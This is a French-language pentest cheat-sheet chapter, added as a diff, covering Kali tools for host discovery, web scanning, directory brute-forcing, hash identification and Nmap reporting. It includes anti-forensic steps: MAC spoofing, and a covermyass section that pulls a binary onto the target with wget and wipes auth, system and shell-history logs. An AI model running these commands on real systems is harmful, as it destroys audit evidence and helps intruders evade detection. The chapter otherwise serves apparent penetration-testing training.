@@ -1,0 +1,243 @@
+# 16 — Outils Complémentaires
+
+-----
+
+## netdiscover — découverte d’hôtes sur le réseau
+
+```bash
+# Scanner le réseau local pour trouver l'IP cible
+sudo netdiscover -i eth0
+
+# Scanner un réseau spécifique
+sudo netdiscover -i eth0 -r 192.168.1.0/24
+
+# Mode passif (écoute sans envoyer de paquets)
+sudo netdiscover -i eth0 -p
+```
+
+**Lire les résultats**
+
+```
+IP               At MAC Address      Count  Len  MAC Vendor
+192.168.1.1      00:50:56:c0:00:08   1      60   VMware (routeur)
+192.168.1.131    00:0c:29:bd:96:88   1      60   VMware ← cible inconnue
+192.168.1.254    00:50:56:eb:82:7c   2      120  VMware (infra réseau)
+```
+
+> La cible est l’IP avec un vendor inconnu ou différent des équipements réseau habituels.
+
+-----
+
+## dimitry — collecte d’infos rapide
+
+```bash
+# Scan des ports ouverts
+dimitry -p 192.168.1.131
+
+# Collecte complète (ports + infos host)
+dimitry -winsepb 192.168.1.131
+
+# Résultat dans un fichier
+dimitry -p 192.168.1.131 > dimitry.txt
+```
+
+> Moins précis que Nmap mais rapide pour un premier aperçu des ports ouverts.
+
+-----
+
+## macchanger — changer son adresse MAC
+
+```bash
+# Voir l'adresse MAC actuelle
+macchanger -s eth0
+
+# Changer pour une adresse aléatoire
+sudo macchanger -r eth0
+
+# Changer pour une adresse spécifique
+sudo macchanger -m 34:17:eb:ca:51:ff eth0
+
+# Restaurer l'adresse MAC d'origine
+sudo macchanger -p eth0
+```
+
+> Le changement est temporaire — réinitialisé au prochain redémarrage.
+
+**Vérifier que le changement est effectif**
+
+```bash
+macchanger -s eth0
+# Current MAC:   34:17:eb:ca:51:ff (Dell Inc)
+# Permanent MAC: 00:0c:29:c0:19:41 (VMware, Inc.)
+```
+
+-----
+
+## nikto — scanner de vulnérabilités web
+
+```bash
+# Scan basique
+nikto -h http://192.168.1.131
+
+# Scan avec export HTML
+nikto -h http://192.168.1.131 -Format html -output rapport_nikto.html
+
+# Scan sur un port non standard
+nikto -h http://192.168.1.131:8080
+
+# Scan HTTPS
+nikto -h https://192.168.1.131
+
+# Scan avec un cookie de session
+nikto -h http://192.168.1.131 -cookies "PHPSESSID=abc123"
+```
+
+**Ce que nikto détecte automatiquement**
+
+```
+- Headers de sécurité manquants (X-Frame-Options, CSP, etc.)
+- Répertoires listables (/files/, /backup/, etc.)
+- Fichiers sensibles exposés (/README, /icons/, etc.)
+- Versions de serveur obsolètes (Apache 2.4.18, etc.)
+- Méthodes HTTP autorisées (OPTIONS, PUT, DELETE)
+```
+
+-----
+
+## dirb — brute-force de répertoires web
+
+```bash
+# Scan basique avec wordlist par défaut
+dirb http://192.168.1.131
+
+# Avec une wordlist spécifique
+dirb http://192.168.1.131 /usr/share/wordlists/dirb/big.txt
+
+# Avec extension de fichiers
+dirb http://192.168.1.131 -X .php,.txt,.html
+
+# Export des résultats
+dirb http://192.168.1.131 -o dirb_results.txt
+
+# Ignorer un code HTTP (ex: ignorer les 404)
+dirb http://192.168.1.131 -N 404
+```
+
+**Wordlists dirb disponibles sur Kali**
+
+```bash
+ls /usr/share/wordlists/dirb/
+# common.txt    → rapide, scan initial
+# big.txt       → plus complet
+# small.txt     → très rapide, peu de résultats
+```
+
+-----
+
+## hashid — identifier le type de hash
+
+```bash
+# Identifier un hash
+hashid cf4c2232354952690368f1b3dfdfb24d
+
+# Depuis un fichier
+hashid -f hash.txt
+
+# Avec le mode hashcat correspondant
+hashid -m cf4c2232354952690368f1b3dfdfb24d
+```
+
+**Résultat typique**
+
+```
+Analyzing 'cf4c2232354952690368f1b3dfdfb24d'
+[+] MD2
+[+] MD5       ← le plus probable pour un hash de 32 caractères
+[+] MD4
+[+] NTLM
+```
+
+**Référence modes hashcat**
+
+```
+hashcat -m 0     → MD5
+hashcat -m 100   → SHA1
+hashcat -m 1000  → NTLM
+hashcat -m 1800  → sha512crypt (Linux /etc/shadow)
+hashcat -m 18200 → AS-REP (Kerberos)
+hashcat -m 13100 → TGS (Kerberoasting)
+```
+
+-----
+
+## covermyass — nettoyage automatique des traces
+
+```bash
+# Télécharger sur ta machine Kali
+curl -sSL https://github.com/sundowndev/covermyass/releases/latest/download/covermyass_linux_amd64 \
+  -o ./covermyass
+chmod +x covermyass
+
+# Servir le fichier vers la cible
+python3 -m http.server 8080
+
+# Depuis la machine cible — récupérer et exécuter
+wget http://[IP_KALI]:8080/covermyass
+chmod +x covermyass
+
+# Voir les fichiers de logs trouvés
+./covermyass
+
+# Effacer les traces (5 passages, remplacement par données inutiles)
+sudo ./covermyass --write -z -n 5
+```
+
+**Ce que covermyass supprime**
+
+```
+/var/log/auth.log
+/var/log/syslog
+/var/log/kern.log
+/var/log/faillog
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/root/.bash_history
+... et autres logs système
+```
+
+-----
+
+## xsltproc — convertir le rapport Nmap en HTML
+
+```bash
+# Générer le rapport Nmap en XML
+nmap -A -sV -sC -p- -oA rapport_nmap 192.168.1.131
+# Crée : rapport_nmap.xml, rapport_nmap.nmap, rapport_nmap.gnmap
+
+# Convertir en HTML lisible
+xsltproc rapport_nmap.xml -o rapport_nmap.html
+
+# Ouvrir dans le navigateur
+xdg-open rapport_nmap.html
+```
+
+> Pratique pour intégrer le scan Nmap directement dans le rapport final en annexe.
+
+-----
+
+## Workflow recommandé — dans l’ordre
+
+```
+1. macchanger -r eth0              → changer MAC avant tout
+2. netdiscover -i eth0             → trouver l'IP cible
+3. dimitry -p [IP]                 → aperçu rapide des ports
+4. nmap -sV -sC [IP] -oA scan      → scan complet avec export
+5. nikto -h http://[IP]            → vulnérabilités web
+6. dirb http://[IP]                → répertoires cachés
+   ↓ exploitation...
+7. hashid [hash]                   → identifier les hashes trouvés
+8. hashcat / john                  → cracker les hashes
+   ↓ fin de mission...
+9. covermyass --write -z -n 5      → nettoyer les traces
+10. xsltproc scan.xml -o scan.html → rapport Nmap en annexe
+```
